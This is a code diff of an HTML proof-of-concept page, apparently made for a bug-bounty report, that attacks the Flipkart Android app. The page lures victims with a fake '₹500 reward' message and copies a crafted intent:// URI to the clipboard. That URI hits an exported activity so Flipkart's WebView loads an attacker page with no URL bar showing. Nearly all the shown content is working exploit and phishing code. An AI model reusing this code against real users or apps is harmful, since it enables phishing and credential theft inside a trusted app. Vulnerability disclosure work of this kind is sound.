@@ -220,17 +220,17 @@
         Claim your exclusive reward before it expires! Tap the link below 👇
       </div>
 
-      <!-- THE ATTACK LINK — uses intent:// to open Flipkart's exported Activity -->
-      <a class="link-preview" id="attackLink" href="#" onclick="fireAttack(event)">
+      <!-- THE ATTACK — copies intent:// URL to clipboard; user then taps Chrome address bar -->
+      <div class="link-preview" id="attackLink" onclick="fireAttack()" style="cursor:pointer">
         <div class="link-preview-img">🛍️</div>
         <div class="link-preview-body">
           <div class="link-preview-title">Flipkart Big Billion Days — Claim ₹500 Reward</div>
           <div class="link-preview-domain">flipkart.com</div>
           <div class="link-preview-desc">Exclusive sale offer. Limited time. Tap to claim your reward instantly.</div>
         </div>
-      </a>
+      </div>
 
-      <div class="tap-hint">⬆️ Tap the Flipkart link to open in app</div>
+      <div class="tap-hint" id="tapHint">⬆️ Tap the link above to claim reward in Flipkart</div>
       <div class="msg-time">10:42 AM ✓✓</div>
     </div>
   </div>
@@ -252,33 +252,26 @@
 
 <script>
 // ──────────────────────────────────────────────────────────────────────────────
-// FK2 VRP — Zero-permission, zero-APK attack via intent:// URI
+// FK2 VRP — Zero-permission, zero-APK attack via clipboard injection
 //
 // Attack chain:
-//   User taps link in Chrome
-//   → Chrome fires intent to HomeFragmentHolderActivity (exported, no permission)
-//   → Flipkart's webView.postUrl() POSTs to httpbin redirect endpoint
-//   → httpbin 302 → GET ankitkanojiy.github.io/test_page/fk2_poc.html
-//   → Attacker HTML renders inside Flipkart with NO URL bar visible
+//   1. Victim visits this page (e.g. link sent via WhatsApp/SMS)
+//   2. Victim taps the "Flipkart" link card → intent:// URL copied to clipboard
+//   3. Victim opens Chrome address bar → Chrome surfaces clipboard as app-link suggestion
+//   4. Victim taps suggestion → Chrome fires intent to HomeFragmentHolderActivity
+//   5. Flipkart's webView.postUrl() POSTs to httpbin → 302 → GET fk2_poc.html
+//   6. Attacker HTML renders inside Flipkart with NO URL bar visible
 // ──────────────────────────────────────────────────────────────────────────────
 
-// Flipkart's WebView uses postUrl() so we need a POST-accepting URL that
-// redirects (302) to our actual PoC page (GitHub Pages accepts GET only).
 var PHISHING_URL = "https://httpbin.org/redirect-to?url=" +
   encodeURIComponent("https://ankitkanojiy.github.io/test_page/fk2_poc.html") +
   "&status_code=302";
 
-// ACTION_KEY JSON that HomeFragmentHolderActivity routes to openWebView()
-// screenType "webView" → performWebViewActions() → webView.postUrl(params.url)
 var actionKey = JSON.stringify({
   screenType: "webView",
   params: { url: PHISHING_URL }
 });
 
-// intent:// URI using scheme=flipkart which matches HomeFragmentHolderActivity's
-// registered BROWSABLE filter (Scheme: "flipkart"). Chrome resolves this without
-// going to Play Store. ACTION_KEY extra is passed; HFHA reads it on onResume()
-// → openWebView() loads our attacker URL. No APK, no permissions needed.
 var intentUrl = "intent://unused#Intent;" +
   "scheme=flipkart;" +
   "package=com.flipkart.android;" +
@@ -287,10 +280,29 @@ var intentUrl = "intent://unused#Intent;" +
   "S.ACTION_KEY=" + encodeURIComponent(actionKey) + ";" +
   "end;";
 
-document.getElementById('attackLink').href = intentUrl;
-
-function fireAttack(e) {
-  e.currentTarget.href = intentUrl;
+function fireAttack() {
+  navigator.clipboard.writeText(intentUrl).then(function() {
+    document.getElementById('tapHint').textContent =
+      "✅ Link copied! Now tap Chrome's address bar → tap the Flipkart suggestion";
+    document.getElementById('tapHint').style.background = 'rgba(0,168,132,0.3)';
+    document.getElementById('tapHint').style.color = '#00d4a8';
+    document.getElementById('tapHint').style.fontWeight = '600';
+    document.getElementById('attackLink').style.border = '2px solid #00a884';
+  }).catch(function() {
+    // Fallback: try old execCommand
+    var ta = document.createElement('textarea');
+    ta.value = intentUrl;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.focus();
+    ta.select();
+    try { document.execCommand('copy'); } catch(e) {}
+    document.body.removeChild(ta);
+    document.getElementById('tapHint').textContent =
+      "✅ Copied! Tap Chrome address bar → tap the Flipkart link suggestion";
+    document.getElementById('tapHint').style.color = '#00d4a8';
+  });
 }
 </script>
 
